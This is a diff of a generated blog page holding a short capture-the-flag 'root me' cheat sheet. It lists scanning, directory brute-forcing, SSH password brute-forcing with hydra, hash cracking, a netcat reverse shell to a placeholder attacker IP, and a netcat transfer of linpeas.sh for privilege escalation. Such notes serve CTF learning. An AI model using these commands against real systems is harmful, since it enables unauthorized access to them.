@@ -11,7 +11,7 @@
 <meta name="description" content="Root me process">
 <meta name="author" content="Bo Wei Chen">
 <link rel="canonical" href="https://BWbwchen.github.io/posts/ctf_rootme_process/" />
-<link href="/assets/css/stylesheet.min.d5d820de85dae34a78c22303e07aa685bb90ec25a056c702c0b1a964ca68861d.css" integrity="sha256-1dgg3oXa40p4wiMD4HqmhbuQ7CWgVscCwLGpZMpohh0=" rel="preload stylesheet"
+<link href="/assets/css/stylesheet.min.16158c8087e20777fae960c355760affd58290b604a39d72053581389a2a6bdb.css" integrity="sha256-FhWMgIfiB3f66WDDVXYK/9WCkLYEo51yBTWBOJoqa9s=" rel="preload stylesheet"
     as="style">
 
 <link rel="icon" href="https://BWbwchen.github.io/favicon.ico">
@@ -21,7 +21,7 @@
 <link rel="mask-icon" href="https://BWbwchen.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.87.0" />
 
 
 <meta property="og:title" content="CTF rootme process" />
@@ -178,32 +178,32 @@ January 31, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Bo Wei Chen
 <ol>
 <li>nmap the ip address</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV &lt;ip_addr&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV &lt;ip_addr&gt;
 </code></pre></div><ol start="2">
 <li>nikto to find vulnerability</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nikto -h &lt;url&gt; 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nikto -h &lt;url&gt; 
 </code></pre></div><ol start="3">
 <li>gobuster to brute-force directory</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;
 </code></pre></div><ol start="4">
 <li>brute-force the ssh password : hydra</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -l &lt;user_name&gt; -P &lt;word_list&gt; &lt;protocol&gt;://&lt;ip_addr&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -l &lt;user_name&gt; -P &lt;word_list&gt; &lt;protocol&gt;://&lt;ip_addr&gt;
 </code></pre></div><ol start="5">
 <li>john the ripper</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john &lt;encrypted&gt; --wordlist<span style="color:#f92672">=</span>&lt;word_list&gt; <span style="color:#f92672">(</span>--format<span style="color:#f92672">=</span>&lt;format&gt;<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john &lt;encrypted&gt; --wordlist<span style="color:#f92672">=</span>&lt;word_list&gt; <span style="color:#f92672">(</span>--format<span style="color:#f92672">=</span>&lt;format&gt;<span style="color:#f92672">)</span>
 </code></pre></div><ol start="6">
 <li>reverse shell</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash    <span style="color:#75715e"># target machine</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash    <span style="color:#75715e"># target machine</span>
 nc -lvp &lt;port&gt;                          <span style="color:#75715e"># attacker machine</span>
 </code></pre></div><ol start="7">
 <li>reverse shell send file (ex: send linpeas.sh)</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -p &lt;port&gt; &gt; &lt;file&gt; &lt; /dev/null    <span style="color:#75715e"># target machine</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -p &lt;port&gt; &gt; &lt;file&gt; &lt; /dev/null    <span style="color:#75715e"># target machine</span>
 cat &lt;file&gt; | nc &lt;target_ip&gt; &lt;port&gt;      <span style="color:#75715e"># attacker machine</span>
 </code></pre></div><ol start="4">
 <li>linpeas.sh to find privilege escalation</li>
@@ -288,7 +288,7 @@ cat &lt;file&gt; | nc &lt;target_ip&gt; &lt;port&gt;      <span style="color:#75
 
 
 
-<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
     onload="hljs.initHighlightingOnLoad();"></script>
 <script>
     window.onload = function () {
